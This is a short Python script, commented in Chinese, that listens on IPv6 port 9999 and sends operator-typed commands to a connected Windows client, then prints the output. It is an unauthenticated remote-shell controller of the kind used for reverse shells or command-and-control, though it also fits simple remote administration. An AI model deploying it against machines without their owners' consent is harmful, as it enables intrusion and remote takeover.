import socket
import os

# 定义服务器地址和端口
HOST = '::'  # 监听所有IPv6地址
PORT = 9999  # 监听端口

def handle_client_connection(client_socket):
    try:
        # 循环发送命令给Windows并接收返回结果
        while True:
            command = input("Enter command to execute on Windows (or type 'exit' to quit): ")
            if command.lower() == 'exit':
                break

            # 发送命令到Windows客户端
            client_socket.send(command.encode('utf-8'))

            # 获取Windows执行结果
            result = client_socket.recv(4096).decode('utf-8')
            print(f"Windows result:\n{result}")

    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

def main():
    # 创建一个socket对象
    server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"Listening on {HOST}:{PORT}...")

    while True:
        # 等待客户端连接
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        handle_client_connection(client_socket)

if __name__ == "__main__":
    main()
